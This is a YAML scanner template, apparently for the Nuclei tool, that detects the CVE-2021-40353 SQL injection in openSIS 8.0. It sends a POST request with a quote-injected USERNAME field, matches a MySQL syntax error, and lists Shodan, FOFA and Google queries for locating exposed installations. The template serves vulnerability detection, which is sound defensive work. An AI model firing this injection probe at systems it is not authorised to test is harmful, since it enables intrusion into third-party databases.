id: CVE-2021-40353

info:
  name: SQL Injection in openSIS 8.0
  author: ProjectDiscoveryAI
  severity: critical
  description: A SQL injection vulnerability exists in version 8.0 of openSIS when MySQL or MariaDB is used as the application database. An attacker can issue the SQL command through the USERNAME parameter using a malformed SQL query to trigger a syntax error revealing database information.
  impact: |
    Allows attackers to execute arbitrary SQL commands on the database.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40353
    - https://github.com/5qu1n7/CVE-2021-40353
    - https://www.opensis.com/download/english
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/n0-traces/cve_monitor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40353
    cwe-id: CWE-89
    epss-score: 0.00181
    epss-percentile: 0.56564
    cpe: cpe:2.3:a:os4ed:opensis:8.0:*:*:*:*:*:*:*
  metadata:
    vendor: os4ed
    product: opensis
    shodan-query: http.title:"openSIS"
    fofa-query: title="opensis"
    google-query: intitle:"opensis"

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php"

    body: |
      USERNAME=user1'&password=test

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "You have an error in your SQL syntax"
        part: body
